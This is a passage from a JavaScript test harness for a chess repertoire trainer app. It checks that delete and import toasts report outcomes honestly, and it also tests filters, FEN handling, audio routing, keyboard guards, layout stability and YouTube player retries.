        await s.removeCurrentLineFromRepertoire();
        check('CODE-09.a', !toasts.some((t) => /Removed from/i.test(t.msg)),
            'no "Removed" toast when deleted_count is 0', JSON.stringify(toasts));
        check('CODE-09.b', toasts.some((t) => /Nothing was removed/i.test(t.msg)),
            'the user is told nothing was removed', JSON.stringify(toasts));
        check('CODE-09.c', !toasts.some((t) => t.msg === 'AUDIO_SUCCESS'),
            'no success chime for a destructive no-op', JSON.stringify(toasts));
        const del = env.calls.find((c) => c.method === 'DELETE');
        check('CODE-09.d', del && del.body.repertoire === 'white',
            'the delete targets the move\'s own repertoire despite the flipped board',
            del ? JSON.stringify(del.body) : 'no DELETE issued');
        env.dispose();

        // (b) legacy server (no deleted_count) -> verified via check_line
        const env2 = makeEnv({
            routes: {
                'DELETE /api/repertoire/move': { status: 200, body: { status: 'ok' } },
                'POST /api/scout/check_line': { status: 200, body: { status: 'already_present', matched_plies: 1, total_plies: 1 } }
            }
        });
        const toasts2 = [];
        env2.win.showToast = (msg) => toasts2.push(msg);
        env2.win.chessAudio = { playSuccess() { toasts2.push('AUDIO_SUCCESS'); }, playRemove() { toasts2.push('AUDIO_REMOVE'); }, playCapture() {} };
        env2.win.repertoireBuilder = { loadRepertoire() {} };
        const exports2 = loadScout(env2.doc, env2.win);
        const s2 = fakeScout(env2, exports2);
        s2.lineTree.addMove(MOVES.e4);
        await s2.removeCurrentLineFromRepertoire();
        check('CODE-09.e', !toasts2.some((m) => /Removed from/i.test(m)) && toasts2.some((m) => /Nothing was removed/i.test(m)),
            'a legacy 200/ok answer is verified before claiming success', JSON.stringify(toasts2));
        env2.dispose();
    });

    /* -------------------------------- CODE-04 (import outcome honesty) */
    await section('CODE-04 — import must report what actually happened', async () => {
        const env = makeEnv({
            routes: {
                'POST /api/scout/import_repertoire': {
                    status: 200,
                    body: { status: 'success', imported_count: 0, already_present: false, errors: ['Illegal move: e2e5'], message: 'x' }
                }
            }
        });
        const toasts = [];
        env.win.showToast = (msg, color) => toasts.push({ msg, color });
        env.win.chessAudio = { playSuccess() { toasts.push({ msg: 'AUDIO_SUCCESS' }); }, playRemove() {} };
        env.win.repertoireBuilder = { loadRepertoire() { toasts.push({ msg: 'BUILDER_RELOAD' }); }, loadStudies() {} };
        env.win.promptStudySelection = async () => 'StudyA';
        const exports = loadScout(env.doc, env.win);
        const s = fakeScout(env, exports);
        s.lineTree.addMove(MOVES.e4);
        const ok = await s.importToRepertoire('white');
        check('CODE-04.a', ok === false, 'a total failure is not reported as success', String(ok));
        check('CODE-04.b', toasts.some((t) => /failed/i.test(t.msg) && /Illegal move: e2e5/.test(t.msg)),
            'the failure toast surfaces the server errors', JSON.stringify(toasts));
        check('CODE-04.c', !toasts.some((t) => t.msg === 'AUDIO_SUCCESS'),
            'no success chime on a total failure', JSON.stringify(toasts));
        check('CODE-04.d', !toasts.some((t) => t.msg === 'BUILDER_RELOAD'),
            'the builder is not reloaded as if something had been saved', JSON.stringify(toasts));
        const trainBtn = env.doc.getElementById('btnScoutTrainAfterImport');
        check('CODE-04.e', trainBtn.style.visibility !== 'visible',
            'the "Train in Trainer" button stays hidden after a failed import', String(trainBtn.style.visibility));
        env.dispose();
    });
    {
        // Replacement warning must be surfaced (AGENTS.md §4E).
        const env = makeEnv({
            routes: {
                'POST /api/scout/import_repertoire': {
                    status: 200,
                    body: {
                        status: 'success', imported_count: 2, already_present: false, errors: [],
                        overlap_status: 'partially_present',
                        message: 'First 1 plies already in White repertoire.',
                        overlap_details: {
                            status: 'partially_present', repertoire: 'white', matched_plies: 1, total_plies: 2, new_plies: 1,
                            message: 'At move 2, Nc3 replaces your prepared Nf3 for White!',
                            divergence_info: { type: 'user_move_alternative', ply: 2, new_san: 'Nc3', existing_san: 'Nf3' }
                        }
                    }
                }
            }
        });
        const toasts = [];
        env.win.showToast = (msg, color) => toasts.push({ msg, color });
        env.win.chessAudio = { playSuccess() {}, playRemove() {} };
        env.win.repertoireBuilder = { loadRepertoire() {}, loadStudies() {} };
        env.win.promptStudySelection = async () => 'StudyA';
        const exports = loadScout(env.doc, env.win);
        const s = fakeScout(env, exports);
        s.lineTree.addMove(MOVES.e4);
        s.lineTree.addMove(MOVES.e5);
        s.currentStudy = 'StudyA';
        s.activeLineOverlap = {
            white: { status: 'partially_present', matched_plies: 1, total_plies: 2, new_plies: 1, divergence_info: { type: 'user_move_alternative', ply: 2, new_san: 'Nc3', existing_san: 'Nf3' } },
            black: null
        };
        env.doc.confirmResult = true;
        const ok = await s.importToRepertoire('white');
        check('CODE-04.f', ok === true, 'a partial import still counts as success', String(ok));
        check('CODE-04.g', env.doc.confirmCalls.length === 1,
            'a divergent import asks for confirmation BEFORE destroying the prepared move',
            JSON.stringify(env.doc.confirmCalls));
        check('CODE-04.h', toasts.some((t) => /REPLACES your prepared Nf3/i.test(t.msg)),
            'the replacement warning is shown to the user', JSON.stringify(toasts));
        check('CODE-04.i', toasts.some((t) => /added 2 moves/i.test(t.msg)),
            'the imported move count is reported', JSON.stringify(toasts));
        env.dispose();
    }

    /* ------------------------------------------ CODE-16 (filter buttons) */
    await section('CODE-16 — the three non-"all" filters must actually filter', async () => {
        const env = makeEnv();
        const exports = loadScout(env.doc, env.win);
        env.win.showToast = () => {};
        const s = fakeScout(env, exports);
        s.cachedResults = [
            { id: '1', source_type: 'youtube', title: 'VIDEO' },
            { id: '2', source_type: 'eco_guide', title: 'GUIDE' },
            { id: '3', source_type: 'lichess_study', title: 'STUDY' },
            { id: '4', source_type: 'youtube', title: 'FAV', is_favorite: true }
        ];
        const cases = [
            ['youtube', ['VIDEO', 'FAV']],
            ['eco_guide', ['GUIDE', 'STUDY']],
            ['favorites', ['FAV']],
            ['all', ['VIDEO', 'GUIDE', 'STUDY', 'FAV']]
        ];
        for (const [filter, expected] of cases) {
            s.activeFilter = filter;
            s.renderResults();
            const html = env.doc.getElementById('scoutResultsGrid').innerHTML;
            const shown = expected.filter((t) => html.includes(t));
            const others = ['VIDEO', 'GUIDE', 'STUDY', 'FAV'].filter((t) => !expected.includes(t) && html.includes(t));
            check(`CODE-16[${filter}]`, shown.length === expected.length && others.length === 0,
                `filter "${filter}" shows exactly ${JSON.stringify(expected)}`,
                `shown=${JSON.stringify(shown)} leaked=${JSON.stringify(others)}`);
        }
        // loadRecent() is reachable from the shelf and hits the endpoint.
        env.routes['GET /api/scout/recent'] = { status: 200, body: [{ source_id: 'r1', source_type: 'youtube', title: 'RECENT', duration: 120 }] };
        s.activeFilter = 'recent';
        await s.loadRecent();
        check('CODE-16.recent', /RECENT/.test(env.doc.getElementById('scoutResultsGrid').innerHTML),
            'the Recent History filter loads /api/scout/recent',
            env.calls.filter((c) => c.path === '/api/scout/recent').length + ' calls');
        env.dispose();
    });

    /* ------------------------------------------- CODE-17 (FEN / traversal) */
    await section('CODE-17 — canonical FENs, no phantom transpositions, branch-aware Next', async () => {
        const env = makeEnv();
        const exports = loadScout(env.doc, env.win);
        const t = new exports.SessionLineTree();
        // The same move recorded once with a 4-field and once with a 6-field FEN.
        t.addMove({ fen_before: START4, fen_after: FEN_AFTER_E4, uci: 'e2e4', san: 'e4', color: 'white', move_number: 1 });
        t.currentNode = t.root;
        t.addMove({ fen_before: `${START4} 0 1`, fen_after: `${FEN_AFTER_E4} 0 1`, uci: 'e2e4', san: 'e4', color: 'white', move_number: 1 });
        check('CODE-17.a', t.root.children.length === 1,
            'a 4-field and a 6-field record of the same move collapse into one node',
            `children=${t.root.children.length}`);
        check('CODE-17.b', t.getAllUniqueMoves().length === 1,
            'getAllUniqueMoves() de-duplicates across FEN formats',
            `moves=${t.getAllUniqueMoves().length}`);
        // Two distinct legal moves never share a FEN -> the "transposition"
        // clause was unreachable dead code; now it can only match an equal FEN.
        const t2 = new exports.SessionLineTree();
        t2.addMove({ fen_before: START4, fen_after: FEN_AFTER_E4, uci: 'e2e4', san: 'e4', color: 'white' });
        t2.currentNode = t2.root;
        t2.addMove({ fen_before: START4, fen_after: 'rnbqkbnr/pppppppp/8/8/3P4/8/PPP1PPPP/RNBQKBNR b KQkq -', uci: 'd2d4', san: 'd4', color: 'white' });
        check('CODE-17.c', t2.root.children.length === 2,
            'two different first moves stay two separate branches',
            `children=${t2.root.children.length}`);
        env.dispose();
    });
    {
        // nextStep() must follow a deterministic branch (not children[0]).
        const env = makeEnv();
        const exports = loadScout(env.doc, env.win);
        env.win.showToast = () => {};
        const s = fakeScout(env, exports);
        s.streamEvaluation = () => {};
        s.renderTreeLines = () => {};
        s._updateBoardLabels = () => {};
        s.updateActiveLineCounts = () => {};
        s.board = { loadFEN() {}, render() {}, lastMove: null, clearArrows() {} };
        const afterE4 = s.lineTree.addMove(MOVES.e4);
        s.lineTree.addMove({ ...MOVES.e5, uci: 'g8f6', san: 'Nf6' });
        s.lineTree.currentNode = afterE4;
        s.lineTree.addMove({ ...MOVES.e5, uci: 'e7e5', san: 'e5' });
        s.lineTree.currentNode = afterE4;
        s.nextStep();
        check('CODE-17.d', s.lineTree.currentNode.move.uci === 'e7e5',
            'Next follows the most recently created branch deterministically',
            s.lineTree.currentNode.move.uci);
        env.dispose();
    }

    /* ------------------------------------------- CODE-19 (badge renderer) */
    await section('CODE-19 — one §4E-compliant badge renderer', async () => {
        const env = makeEnv();
        const exports = loadScout(env.doc, env.win);
        env.win.repertoireBuilder = null;
        env.win.showToast = () => {};
        const s = fakeScout(env, exports);
        s.lineTree.addMove(MOVES.e4);
        const lineId = s.lineTree.getAllLines()[0].lineId;
        const partial = { status: 'partially_present', matched_plies: 4, total_plies: 8, new_plies: 4, message: 'm' };
        s.treeOverlapMap = { white: { [lineId]: partial }, black: {} };
        s.renderTreeLines();
        const cardHtml = env.doc.getElementById('scoutVariationsList').innerHTML;
        // Now simulate the async refresh path on the same data.
        s._applyTreeBadges(s.lineTree.getAllLines());
        const applied = env.doc.getElementById('scoutVariationsList');
        check('CODE-19.a', /⚡ White: 4\/8 in Rep \(\+4 new\)/.test(cardHtml),
            'the card uses the AGENTS.md §4E wording', cardHtml.slice(0, 600));
        check('CODE-19.b', !/⚡ White: 4\/8 \(\+4 new\)/.test(cardHtml),
            'the divergent short form is gone', cardHtml.slice(0, 600));
        const src = fs.readFileSync(SRC.scout, 'utf8');
        const badgeStrings = (src.match(/⚡ \$\{|⚡ /g) || []).length;
        check('CODE-19.c', badgeStrings <= 1,
            'the badge text is produced in exactly one place', `occurrences=${badgeStrings}`);
        void applied;
        env.dispose();
    });

    /* -------------------------------------- CODE-20 (audio master bus) */
    await section('CODE-20 — audio: master bus, no throw, no reward chime for deletes', async () => {
        const env = makeEnv();
        const created = [];
        const connected = [];
        class FakeParam { constructor(v) { this.value = v; } setValueAtTime() { return this; } exponentialRampToValueAtTime() { return this; } }
        class FakeNode {
            constructor(kind) { this.kind = kind; this.gain = new FakeParam(1); this.frequency = new FakeParam(440); this.threshold = new FakeParam(0); this.knee = new FakeParam(0); this.ratio = new FakeParam(1); this.attack = new FakeParam(0); this.release = new FakeParam(0); }
            connect(dest) { connected.push([this.kind, dest && dest.kind]); return dest; }
            disconnect() {}
            start() {} stop() {} set onended(_v) {} }
        class FakeCtx {
            constructor() { this.currentTime = 1; this.state = 'running'; this.destination = new FakeNode('destination'); created.push(this); }
            createOscillator() { return new FakeNode('osc'); }
            createGain() { return new FakeNode('gain'); }
            createDynamicsCompressor() { return new FakeNode('compressor'); }
            resume() { return Promise.resolve(); }
        }
        env.win.AudioContext = FakeCtx;
        const mod = loadAudio(env.win);
        const audio = mod.ChessAudio;
        audio.playMove();
        check('CODE-20.a', connected.some(([from, to]) => from === 'gain' && to === 'compressor'),
            'every voice is routed through a limiter, not straight to destination',
            JSON.stringify(connected));
        check('CODE-20.b', connected.some(([, to]) => to === 'destination') &&
            !connected.some(([from, to]) => from === 'gain' && to === 'destination'),
            'no voice connects directly to the destination', JSON.stringify(connected));
        check('CODE-20.c', typeof audio.playRemove === 'function',
            'a neutral sound exists for destructive actions', 'playRemove missing');
        // Never throws when Web Audio is unavailable / throws.
        env.win.AudioContext = undefined;
        const audio2 = loadAudio(env.win).ChessAudio;
        let threw = false;
        try { audio2.playMove(); audio2.playSuccess(); audio2.playBlunder(); } catch (e) { threw = true; }
        check('CODE-20.d', !threw, 'no throw when AudioContext is unavailable', 'threw');
        env.win.AudioContext = function () { throw new Error('blocked'); };
        const audio3 = loadAudio(env.win).ChessAudio;
        threw = false;
        try { audio3.playCapture(); } catch (e) { threw = true; }
        check('CODE-20.e', !threw, 'no throw when the AudioContext constructor throws', 'threw');
        env.dispose();
    });

    /* ------------------------------------------ CODE-22 (keyboard guard) */
    await section('CODE-22 — the scout keyboard handler must respect form controls', async () => {
        const env = makeEnv();
        const exports = loadScout(env.doc, env.win);
        const s = fakeScout(env, exports);
        s.prevStep = () => { s.step = 'prev'; };
        s.nextStep = () => { s.step = 'next'; };
        s.lastStep = () => { s.step = 'last'; };
        s.firstStep = () => { s.step = 'first'; };
        s.undoUserMove = () => { s.step = 'undo'; };
        s._bindUI();
        env.doc.getElementById('viewScout').classList.add('active');
        const select = new FakeEl('select');
        const evt = (key, extra = {}) => Object.assign({ key, target: select, preventDefault() { evt.defaultPrevented = true; }, ctrlKey: false, metaKey: false, altKey: false, repeat: false }, extra);
        s.step = null;
        env.win.dispatch('keydown', evt('ArrowDown'));
        check('CODE-22.a', s.step === null, 'ArrowDown inside a <select> is not hijacked', String(s.step));
        s.step = null;
        const ctrlZ = evt('z', { ctrlKey: true });
        env.win.dispatch('keydown', ctrlZ);
        check('CODE-22.b', s.step === null && !ctrlZ.defaultPrevented,
            'Ctrl+Z is neither hijacked nor swallowed', `step=${s.step} prevented=${!!ctrlZ.defaultPrevented}`);
        s.step = null;
        const uEvt = evt('u', { target: new FakeEl('div') });
        env.win.dispatch('keydown', uEvt);
        check('CODE-22.c', s.step === 'undo', 'plain "u" still undoes', String(s.step));
        s.step = null;
        const repEvt = evt('u', { target: new FakeEl('div'), repeat: true });
        env.win.dispatch('keydown', repEvt);
        check('CODE-22.d', s.step === null, 'key repeat does not spam undo', String(s.step));
        env.dispose();
    });

    /* --------------------------------------- CODE-15 / DEAD-01 (dead code) */
    await section('CODE-15 / DEAD-01 — dead selectors, dead methods, duplicate globals', async () => {
        const scoutSrc = stripJsComments(fs.readFileSync(SRC.scout, 'utf8'));
        const deadIds = ['btnImportWhite', 'btnImportBlack', 'scoutActiveLineOverlapBanner',
            'scoutCoreIdea', 'scoutKeyPlans', 'scoutTypicalMistakes', 'scoutImportAlert'];
        const found = deadIds.filter((id) => scoutSrc.includes(`'${id}'`));
        check('CODE-15.a', found.length === 0,
            'the seven ids that do not exist in index.html are no longer looked up',
            `still referenced: ${JSON.stringify(found)}`);
        check('DEAD-01.a', !/renderVariations\s*\(/.test(scoutSrc) &&
            !/addCurrentMoveToRepertoire/.test(scoutSrc) && !/addPlayedLineToRepertoire/.test(scoutSrc),
            'the three dead methods are gone', 'still present');
        const appSrc = stripJsComments(fs.readFileSync(SRC.app, 'utf8'));
        const toastDefs = (appSrc.match(/window\.showToast\s*=\s*function/g) || []).length;
        check('DEAD-01.b', toastDefs === 1, 'window.showToast is defined exactly once', `definitions=${toastDefs}`);
        const trainerSrc = stripJsComments(fs.readFileSync(SRC.trainer, 'utf8'));
        check('DEAD-01.c', !/feedback-box mistake/.test(trainerSrc),
            'the CSS-less `feedback-box mistake` class is no longer emitted', 'still emitted');
        const audioSrc = stripJsComments(fs.readFileSync(SRC.audio, 'utf8'));
        check('CODE-20.f', !/gain\.connect\(this\.ctx\.destination\)/.test(audioSrc),
            'no voice connects straight to the destination any more', 'still present');
    });

    /* ----------------------------------------- CODE-12/13/14/21 (§8, CLS) */
    await section('CODE-12/13/14/21 — §8: conditional UI must not be display-toggled in flow', async () => {
        const trainerSrc = stripJsComments(fs.readFileSync(SRC.trainer, 'utf8'));
        check('CODE-12.a', !/noteBox\.style\.display = 'none'/.test(trainerSrc) &&
            !/banner\.style\.display = 'none'/.test(trainerSrc) &&
            /noteBox\.style\.visibility/.test(trainerSrc) &&
            /banner\.style\.visibility/.test(trainerSrc),
            'the note box and the focus banner are no longer display-toggled in flow', 'still display-toggled');
        check('CODE-13.a', !/badgeEl\.style\.display = data\./.test(trainerSrc) &&
            !/btnArrows\.style\.display =/.test(trainerSrc),
            'the priority badge and the arrows button are no longer display-toggled', 'still display-toggled');

        const env = makeEnv();
        const trainerExports = loadTrainer(env.doc, env.win);
        env.win.showToast = () => {};
        const t = new trainerExports.RepertoireTrainer();
        check('CODE-12.e', typeof t._updateNoteBox === 'function' && typeof t._updateFocusBanner === 'function' && typeof t._updateImportantBadge === 'function',
            'the §8 helpers that reserve constant space exist', 'helper missing');
        if (typeof t._updateNoteBox !== 'function') { env.dispose(); return; }
        t._updateNoteBox('a very long note '.repeat(20));
        const box = env.doc.getElementById('trainNoteBox');
        const before = JSON.stringify(box.style);
        t._updateNoteBox('');
        check('CODE-12.b', box.style.minHeight === box.style.maxHeight && box.style.maxHeight === '44px',
            'the note box reserves a constant height whether or not a note exists', before + ' -> ' + JSON.stringify(box.style));
        check('CODE-12.c', box.style.visibility === 'hidden' && box.style.display === 'block',
            'the note box is hidden with visibility, not display (space reserved)', JSON.stringify(box.style));
        t._updateNoteBox('note');
        check('CODE-12.d', box.style.visibility === 'visible' && JSON.stringify(env.doc.getElementById('trainNoteContent').style).includes('ellipsis'),
            'showing a note clamps the text and sets a title', JSON.stringify(box.style));
        t._updateImportantBadge(false);
        const badge = env.doc.getElementById('trainImportantBadge');
        check('CODE-13.b', badge.style.display === 'inline-flex' && badge.style.visibility === 'hidden' && badge.disabled === true,
            'the priority badge keeps its box and toggles visibility + disabled', JSON.stringify(badge.style));
        t._updateFocusBanner(null);
        const banner = env.doc.getElementById('trainFocusBanner');
        check('CODE-13.c', banner.style.display === 'flex' && banner.style.visibility === 'hidden',
            'the focus banner keeps its box and toggles visibility', JSON.stringify(banner.style));
        env.dispose();
    });
    {
        // The quick-rep toolbar keeps a fixed box for its conditional buttons.
        const env = makeEnv();
        const exports = loadScout(env.doc, env.win);
        env.win.repertoireBuilder = null;
        env.win.showToast = () => {};
        const s = fakeScout(env, exports);
        s.lineTree.addMove(MOVES.e4);
        s.lineTree.addMove(MOVES.e5);
        env.routes['POST /api/scout/check_line'] = { status: 200, body: { status: 'new' } };
        await s.checkActiveLineOverlap();
        const rm = env.doc.getElementById('btnScoutRemoveFromRep');
        check('CODE-14.a', rm.style.display === 'inline-flex' && rm.style.visibility === 'hidden' && rm.disabled === true,
            'the Remove-from-rep button is visibility-toggled with a fixed width', JSON.stringify(rm.style));
        env.dispose();
    }

    /* ------------------------------------------- CODE-11 (YT API retry) */
    await section('CODE-11 — the YouTube API retry / chapter seek', async () => {
        const env = makeEnv();
        const exports = loadScout(env.doc, env.win);
        env.win.showToast = () => {};
        const s = fakeScout(env, exports);
        // No YT API yet: fallback iframe + a retry timer (not a dead dropdown).
        s.setupYouTubePlayer('abc123');
        check('CODE-11.a', s.ytApiRetryTimer !== null,
            'a retry is scheduled when window.YT is missing', String(s.ytApiRetryTimer));
        check('CODE-11.b', /scoutIframeFallback/.test(env.doc.getElementById('scoutYoutubePlayer').innerHTML),
            'a fallback iframe is shown meanwhile',
            env.doc.getElementById('scoutYoutubePlayer').innerHTML);
        const seekBefore = s.seekVideoTo(30);
        check('CODE-11.c', seekBefore === false,
            'seekVideoTo reports failure instead of silently doing nothing', String(seekBefore));
        // Now the API shows up.
        let created = null;
        env.win.YT = {
            Player: function (el, opts) {
                created = opts;
                this.getCurrentTime = () => 12;
                this.getDuration = () => 600;
                this.seekTo = (s2) => { this.lastSeek = s2; };
                this.loadVideoById = () => {};
                opts.events.onReady({ target: this });
            }
        };
        await sleep(700);
        check('CODE-11.d', created && created.videoId === 'abc123',
            'the fallback iframe is upgraded into a real YT.Player', JSON.stringify(created && created.videoId));
        check('CODE-11.e', s.ytPlayerReady === true && typeof s.seekVideoTo === 'function',
            'the player reports ready after the upgrade', String(s.ytPlayerReady));
        const seeked = s.seekVideoTo(42);
        check('CODE-11.f', seeked === true && s.ytPlayer.lastSeek === 42,
            'chapter seeking works after the retry', `${seeked} ${s.ytPlayer && s.ytPlayer.lastSeek}`);
        check('CODE-11.g', /0:12 \/ 10:00/.test(env.doc.getElementById('scoutCurrentTimeDisplay').textContent),
            'the video time display is now driven by the player',
            env.doc.getElementById('scoutCurrentTimeDisplay').textContent);
        env.dispose();
    });

    /* --------------------------------------- CODE-18 (prompt re-entrancy) */
    await section('CODE-18 — promptStudySelection must be re-entrancy safe', async () => {
        const env = makeEnv();
        const modal = env.doc.getElementById('studySelectModal');
        let showModalCalls = 0;
        modal.showModal = function () { showModalCalls++; if (showModalCalls > 1) { const e = new Error('InvalidStateError'); throw e; } };
        modal.close = function () {};
        modal.open = false;
        env.routes['GET /api/repertoire/studies'] = { status: 200, body: [] };
        const appMod = loadApp(env.doc, env.win);
        env.win.showToast = () => {};
        const p1 = env.win.promptStudySelection({ repertoire: 'white', defaultName: 'X' });
        const p2 = env.win.promptStudySelection({ repertoire: 'white', defaultName: 'X' });
        p2.catch(() => {});   // a pre-fix source rejects here; keep the run alive
        check('CODE-18.a', p1 === p2, 'a second call reuses the in-flight promise', 'different promises');
        check('CODE-18.b', showModalCalls === 1, 'showModal() is called at most once', `calls=${showModalCalls}`);
        let rejected = false;
        p1.then(() => {}, () => { rejected = true; });
        await sleep(30);
        check('CODE-18.c', !rejected, 'the shared promise never rejects', 'rejected');
        env.dispose();
    });

    /* ------------------------------------------- DEAD-01 (trainer dup) */
    await section('DEAD-01 — no duplicated trainer progress request', async () => {
        const env = makeEnv();
        const exports = loadTrainer(env.doc, env.win);
        env.win.showToast = () => {};
        const t = new exports.RepertoireTrainer();
        t.isInitialized = true;
        t.board = { setOrientation() {}, loadFEN() {}, clearArrows() {}, setLastMove() {}, setArrows() {}, render() {} };
        env.routes['GET /api/repertoire/train/openings'] = { status: 200, body: { openings: [] } };
        env.routes['GET /api/repertoire/train/progress'] = { status: 200, body: { mastered_pct: 10, learning_pct: 20, unlearned_pct: 70, mastered_count: 1, learning_count: 2, unlearned_count: 3, total_moves: 6, studies: [] } };
        env.routes['GET /api/repertoire/train/next'] = { status: 200, body: { id: 1, parent_fen: START4, expected_uci: 'e2e4', study_name: 'S' } };
        await t.startNewDrill();
        const progressCalls = env.calls.filter((c) => c.path === '/api/repertoire/train/progress').length;
        check('DEAD-01.d', progressCalls === 1,
            'one drill start issues exactly one /train/progress request', `calls=${progressCalls}`);
        env.dispose();
    });

    /* ------------------------------------------------------------- done */
    const failed = results.filter((r) => !r.ok);
    console.log(`\n${LIST_ONLY ? '' : ''}checks: ${results.length}, passed: ${results.length - failed.length}, failed: ${failed.length}`);
    if (failed.length) {
        console.log('failing ids: ' + failed.map((f) => f.id).join(', '));
    }
    process.exit(failed.length ? 1 : 0);
}

run().catch((e) => {
    console.error('HARNESS ERROR:', e && e.stack ? e.stack : e);
    process.exit(2);
});
